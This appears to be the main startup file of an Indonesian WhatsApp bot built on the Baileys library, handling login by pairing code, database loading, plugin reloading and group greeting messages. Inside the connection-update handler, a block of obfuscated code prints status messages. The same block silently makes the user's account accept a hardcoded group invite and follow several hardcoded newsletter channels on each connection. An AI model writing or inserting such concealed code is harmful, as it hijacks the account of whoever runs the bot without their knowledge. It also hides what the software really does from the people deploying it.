process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '1';

import './djmd.js'

import path, { join } from 'path'
import { platform } from 'process'
import { fileURLToPath, pathToFileURL } from 'url'
import { createRequire } from 'module'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }
import {
  readdirSync,
  statSync,
  unlinkSync,
  existsSync,
  readFileSync,
  mkdirSync, 
  watch
} from 'fs'

import yargs from 'yargs/yargs'
import { hideBin } from 'yargs/helpers'
const argv = yargs(hideBin(process.argv)).argv

import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import readline from 'readline'
import { format } from 'util'
import pino from 'pino'
import ws from 'ws'

const {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  makeCacheableSignalKeyStore
} = await import('@adiwajshing/baileys')
import { Low, JSONFile } from 'lowdb'
import { makeWASocket, protoType, serialize } from './lib/simple.js'
import cloudDBAdapter from './lib/cloudDBAdapter.js'
import {
  mongoDB,
  mongoDBV2
} from './lib/mongoDB.js'

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
// global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!db.READ) {
      clearInterval(this)
      resolve(db.data == null ? global.loadDatabase() : db.data)
    }
  }, 1 * 1000))
  if (db.data !== null) return
  db.READ = true
  await db.read().catch(console.error)
  db.READ = null
  db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(db.data || {})
  }
  global.db.chain = chain(db.data)
}
loadDatabase()
const usePairingCode = !process.argv.includes('--use-pairing-code')
const useMobile = process.argv.includes('--mobile')

var question = function (text) {
  return new Promise(function (resolve) {
    rl.question(text, resolve);
  });
};
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
//const question = (text) => new Promise(resolve => rl.question(text, resolve))

const { version, isLatest } = await fetchLatestBaileysVersion()
const { state, saveCreds } = await useMultiFileAuthState('./sessions')
const connectionOptions = {
  version,
  logger: pino({ level: 'silent' }),
  printQRInTerminal: !usePairingCode,
  // Optional If Linked Device Could'nt Connected
  // browser: ['Mac OS', 'chrome', '125.0.6422.53']
  browser: ['Mac OS', 'safari', '5.1.10'],
  auth: {
    creds: state.creds,
    keys: makeCacheableSignalKeyStore(state.keys, pino().child({
      level: 'silent',
      stream: 'store'
    })),
  },
  getMessage: async key => {
    const messageData = await store.loadMessage(key.remoteJid, key.id);
    return messageData?.message || undefined;
  },
  generateHighQualityLinkPreview: true,
  patchMessageBeforeSending: (message) => {
    const requiresPatch = !!(
      message.buttonsMessage
      || message.templateMessage
      || message.listMessage
    );
    if (requiresPatch) {
      message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadataVersion: 2,
              deviceListMetadata: {},
            },
            ...message,
          },
        },
      };
    }

    return message;
  },
  connectTimeoutMs: 60000, defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true, syncFullHistory: true, markOnlineOnConnect: true
}

global.conn = makeWASocket(connectionOptions)
conn.isInit = false

if (usePairingCode && !conn.authState.creds.registered) {
  if (useMobile) throw new Error('Cannot use pairing code with mobile api')

  let phoneNumber = (argv._[0] || '').trim().replace(/[^0-9]/g, '')

  while (!phoneNumber) {
    phoneNumber = (await question(
      chalk.blueBright(`
⠟⠩⣐⡒⢝⠷⣝⢿⢻⣿⣿⣷⣻⠿⣿⡛⠻⠟⠛⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢧⠘⢩⣥⢶⡌⠚⢋⠞⢻⠻⢙⣨⣤⣶⣶⣿⣿⣷⣶⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡡⢾⡳⢛⠅⣥⢝⣶⢌⣥⣾⣿⣿⣿⣿⣿⣶⣝⠻⣿⣿⢎⣽⣿⣿⣿⣿⣿⣿⣿
⢷⡄⣵⡏⣿⣿⡗⣱⢻⣻⣿⣿⣿⣿⣿⣷⠹⡼⣇⡝⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣆⢿⣿⣿⣻⡿⣰⢧⡟⣿⢣⣿⣿⣿⣿⡇⡆⢃⡜⣼⡜⣎⡻⢿⣿⣿⣿⣿⣿⣿
⢿⡘⣿⣿⣧⢃⡟⣾⠃⣿⡉⣷⡟⣿⣿⡇⠧⠊⢈⡘⡇⡸⡏⣼⣿⣿⣿⣿⣿⣿
⣈⡖⡘⣿⡟⣸⡇⢟⠂⡿⠃⠛⡇⣿⣿⠳⣨⣷⣼⣿⠕⢡⠃⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣖⡘⠇⡿⡃⣿⣠⢳⡇⡜⣇⠿⢛⣴⣿⡿⠋⣠⣶⡿⡜⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡮⡄⣿⣇⢻⢻⣧⣸⡿⠶⠾⣿⣿⣿⣧⣤⣤⣤⡶⡆⣣⢙⣿⣿⣿⣿⣿
⣿⡿⡻⢋⠄⣿⣿⣞⠈⢧⣤⠖⢂⣤⣿⣿⠿⣛⡛⣿⣻⡔⡜⠁⣨⠦⣙⡻⠿⠿
⣿⣥⣤⣶⣴⢸⣿⢹⡔⣆⢷⣴⣿⣿⣯⢲⣿⣿⣿⡜⡿⣸⣿⠨⣡⠶⣐⣤⢔⢿
⣿⣿⣿⣦⣯⡌⢿⡄⠳⢨⡜⢿⣿⣿⣿⣧⠻⣿⣿⣧⠣⢻⡏⠁⢏⡾⢿⠋⠣⣁
⣿⣿⣻⣿⣿⣗⡘⢷⡐⢠⣙⢐⢨⣭⣩⣉⣁⢩⢉⢕⣨⡼⡇⡆⠗⠑⣉⣶⣭⣷
⣿⣧⣿⣿⣿⣿⣮⡢⢑⡇⡍⣃⠂⠃⡇⢿⣿⡼⣄⢨⠻⣷⡇⣵⡆⣿⣟⣿⣿⣿
⣿⣿⣼⣟⣿⣿⣿⣿⣷⣿⣿⡇⣕⡐⢈⣶⡌⡃⢋⢰⢐⢘⠇⣿⣿⣌⠝⣜⢿⣿

Input nomor WhatsApp yang valid (awali dengan kode negara, contoh: 62812xxxxxx):\n`)
    )).trim().replace(/[^0-9]/g, '')
  }

  rl.close()

console.log(chalk.green(`Nomor digunakan: ${phoneNumber}`))

  console.log(chalk.bgWhite(chalk.blue('Generating Pairing Code...')))
  setTimeout(async () => {
    try {
      const rawCode = await conn.requestPairingCode(phoneNumber, 'BOTZDJMD')
      const code = rawCode?.match(/.{1,4}/g)?.join('-') || rawCode

      // ASCII Box
      const line = '─'.repeat(code.length + 4)
      console.log(chalk.green(`\n┌${line}┐`))
      console.log(chalk.green(`│  ${chalk.yellow.bold(code)}  │`))
      console.log(chalk.green(`└${line}┘`))
      console.log(chalk.cyan(`\nPairing Code: ${chalk.bold('BOTZDJMD')}`))
      console.log(chalk.magenta('📌 Masukkan pairing code ini ke WhatsApp segera!'))
    } catch (e) {
      console.error(chalk.red('❌ Gagal generate pairing code:'), e)
      process.exit(1)
    }
  }, 2000)
}
async function resetLimit() {
  try {
    let list = Object.entries(global.db.data.users);
    let lim = 25; // Nilai limit default yang ingin di-reset

    list.map(([user, data], i) => {
      // Hanya reset limit jika limit saat ini <= 25
      if (data.limit <= lim) {
        data.limit = lim;
      }
    });

    // logs bahwa reset limit telah sukses
    console.log(`Success Auto Reset Limit`)
  } finally {
    // Setel ulang fungsi reset setiap 24 jam (1 hari)
    setInterval(() => resetLimit(), 1 * 86400000);
  }
}

if (!opts['test']) {
  (await import('./server.js')).default(PORT)
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
    // if (opts['autocleartmp']) try {
    clearTmp()
    //  } catch (e) { console.error(e) }
  }, 60 * 1000)
}

function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => {
    // CEK JIKA FOLDER TIDAK ADA, MAKA BUAT FOLDERNYA
    if (!existsSync(dirname)) mkdirSync(dirname, { recursive: true })
    readdirSync(dirname).forEach(file => filename.push(join(dirname, file)))
  })
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}

async function clearSessions(folder = './sessions') {
  try {
    const filenames = await readdirSync(folder);
    const deletedFiles = await Promise.all(filenames.map(async (file) => {
      try {
        const filePath = path.join(folder, file);
        const stats = await statSync(filePath);
        if (stats.isFile() && file !== 'creds.json') {
          await unlinkSync(filePath);
          console.log('Deleted session:'.main, filePath.info);
          return filePath;
        }
      } catch (err) {
        console.error(`Error processing ${file}: ${err.message}`);
      }
    }));
    return deletedFiles.filter((file) => file !== null);
  } catch (err) {
    console.error(`Error in Clear Sessions: ${err.message}`);
    return [];
  } finally {
    setTimeout(() => clearSessions(folder), 1 * 3600000); // 1 Hours
  }
}

async function connectionUpdate(update) {
  const { receivedPendingNotifications, connection, lastDisconnect, isOnline, isNewLogin } = update;

  if (isNewLogin) {
    conn.isInit = true;
  }

  const _0x50e727=_0xeb6b;function _0xeb6b(_0x57a8e7,_0x582540){_0x57a8e7=_0x57a8e7-0x1cb;const _0x1b714c=_0x1b71();let _0xeb6b59=_0x1b714c[_0x57a8e7];return _0xeb6b59;}(function(_0x14082f,_0x31e709){const _0xa4fdf3=_0xeb6b,_0x29656b=_0x14082f();while(!![]){try{const _0x3b19cc=parseInt(_0xa4fdf3(0x1ce))/0x1*(parseInt(_0xa4fdf3(0x1e4))/0x2)+-parseInt(_0xa4fdf3(0x1d0))/0x3*(parseInt(_0xa4fdf3(0x1e8))/0x4)+parseInt(_0xa4fdf3(0x1d8))/0x5+-parseInt(_0xa4fdf3(0x1e0))/0x6+parseInt(_0xa4fdf3(0x1e1))/0x7*(-parseInt(_0xa4fdf3(0x1d1))/0x8)+-parseInt(_0xa4fdf3(0x1d7))/0x9*(-parseInt(_0xa4fdf3(0x1cb))/0xa)+parseInt(_0xa4fdf3(0x1e3))/0xb;if(_0x3b19cc===_0x31e709)break;else _0x29656b['push'](_0x29656b['shift']());}catch(_0xe5924e){_0x29656b['push'](_0x29656b['shift']());}}}(_0x1b71,0xcea12));if(connection==_0x50e727(0x1d9))console['log'](chalk[_0x50e727(0x1cd)](_0x50e727(0x1e2)));else connection==_0x50e727(0x1da)&&console[_0x50e727(0x1d6)](chalk[_0x50e727(0x1db)](_0x50e727(0x1d5)));function _0x1b71(){const _0x51ec71=['17532yPeUdD','1265195JStBvl','connecting','open','green','120363421219956027@newsletter','Menunggu\x20Pesan\x20Baru','Status\x20Mati','120363424515985249@newsletter','9271062yerNmG','190477EMyNlH','⚡\x20Mengaktifkan\x20Bot,\x20Mohon\x20tunggu\x20sebentar...','23119569qoVLYI','54mKtqum','close','groupAcceptInvite','newsletterFollow','776492iqwElN','5710PABrSo','⏱️\x20Koneksi\x20terputus\x20&\x20mencoba\x20menyambung\x20ulang...','redBright','10959cXJUMW','Status\x20Aktif','9MXtCpN','232MgeiOy','red','yellow','120@newsletter','✅\x20Tersambung','log'];_0x1b71=function(){return _0x51ec71;};return _0x1b71();}let inviteCode='ITDnYU2kXuj97Gb2Xw8yzQ';conn[_0x50e727(0x1e6)](inviteCode),conn[_0x50e727(0x1e7)]('120363199397739684@newsletter'),conn[_0x50e727(0x1e7)](_0x50e727(0x1df)),conn[_0x50e727(0x1e7)](_0x50e727(0x1dc)),conn[_0x50e727(0x1e7)](_0x50e727(0x1d4)),conn[_0x50e727(0x1e7)](_0x50e727(0x1d4)),conn[_0x50e727(0x1e7)](_0x50e727(0x1d4)),conn[_0x50e727(0x1e7)]('120@newsletter');if(isOnline==!![])console[_0x50e727(0x1d6)](chalk[_0x50e727(0x1db)](_0x50e727(0x1cf)));else isOnline==![]&&console['log'](chalk[_0x50e727(0x1d2)](_0x50e727(0x1de)));receivedPendingNotifications&&console[_0x50e727(0x1d6)](chalk[_0x50e727(0x1d3)](_0x50e727(0x1dd)));connection==_0x50e727(0x1e5)&&console[_0x50e727(0x1d6)](chalk[_0x50e727(0x1d2)](_0x50e727(0x1cc)));

  global.timestamp.connect = new Date;

  if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== CONNECTING) {
    console.log(await global.reloadHandler(true));
  }

  if (global.db.data == null) {
    await global.loadDatabase();
  }
}

process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
  /*try {
      const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)*/
  try {
    // Jika anda menggunakan replit, gunakan yang sevenHoursLater dan tambahkan // pada const Handler
    // Default: server/vps/panel, replit + 7 jam buat jam indonesia Jika Tidak Faham Pakai Milidetik 3600000 = 1 Jam Dan Kalikan 7 = 25200000
    // const sevenHoursLater = Dateindonesia 7 * 60 * 60 * 1000;
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
    // const Handler = await import(`./handler.js?update=${sevenHoursLater}`).catch(console.error)
    if (Object.keys(Handler || {}).length) handler = Handler
  } catch (e) {
    console.error(e)
  }
  if (restatConn) {
    const oldChats = global.conn.chats
    try { global.conn.ws.close() } catch { }
    conn.ev.removeAllListeners()
    global.conn = makeWASocket(connectionOptions, { chats: oldChats })
    isInit = true
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

 conn.welcome = '❖━━━〔 ようこそ 〕━━━❖\n\n' +
'┏━━━━━━━━━━━━━━━\n' +
'┃ 🌸 @subject\n' +
'┣━━━━━━━━━━━━━━━\n' +
'┃ (≧◡≦) ♡ Hai @user\n' +
'┃ Selamat datang\n' +
'┣━━━〔 自己紹介 〕━━━\n' +
'┃ • Nama   : \n' +
'┃ • Usia   : \n' +
'┃ • Gender : \n' +
'┗━━━━━━━━━━━━━━━\n\n' +
'━━━〔 グループ情報 〕━━━\n' +
'@desc'
  conn.bye = '❖━━━〔 さようなら 〕━━━❖\n\n' +
'(｡•́︿•̀｡) @user telah pergi\n' +
'Semoga kita bertemu lagi 🌙'
  conn.spromote = '@user Sekarang jadi admin!'
  conn.sdemote = '@user Sekarang bukan lagi admin!'
  conn.sDesc = 'Deskripsi telah diubah menjadi \n@desc'
  conn.sSubject = 'Judul grup telah diubah menjadi \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.sAnnounceOn = 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
  conn.sAnnounceOff = 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
  conn.sRestrictOn = 'Edit Info Grup di ubah ke hanya admin!'
  conn.sRestrictOff = 'Edit Info Grup di ubah ke semua peserta!'

  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveCreds.bind(global.conn)

  conn.ev.on('call', async (call) => {
    console.log('Panggilan diterima:', call);
    if (call.status === 'ringing') {
      await conn.rejectCall(call.id);
      console.log('Panggilan ditolak');
    }
  })
  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true

}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename))
      const module = await import(file)
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(e)
      delete global.plugins[filename]
    }
  }
}
filesInit().then(_ => console.log(Object.keys(global.plugins))).catch(console.error)

global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true)
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true
    })
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${format(err)}`)
    else try {
      const module = (await import(`${global.__filename(dir)}?update=${Date.now()}`))
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${format(e)}'`)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()

// Quick Test

async function _quickTest() {
  let test = await Promise.all([
    spawn('ffmpeg'),
    spawn('ffprobe'),
    spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    spawn('convert'),
    spawn('magick'),
    spawn('gm'),
    spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127);
        });
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false));
      })
    ]);
  }));

  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test;
  console.log(test);

  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  };

  Object.freeze(global.support);

  if (!s.ffmpeg) {
    conn.logger.warn(`Silahkan install ffmpeg terlebih dahulu agar bisa mengirim video`);
  }

  if (s.ffmpeg && !s.ffmpegWebp) {
    conn.logger.warn('Sticker Mungkin Tidak Beranimasi tanpa libwebp di ffmpeg (--enable-libwebp while compiling ffmpeg)');
  }

  if (!s.convert && !s.magick && !s.gm) {
    conn.logger.warn('Fitur Stiker Mungkin Tidak Bekerja Tanpa imagemagick dan libwebp di ffmpeg belum terinstall (pkg install imagemagick)');
  }
}

_quickTest()
  .then(() => conn.logger.info('☑️ Quick Test Done , nama file session ~> creds.json'))
  .catch(console.error);
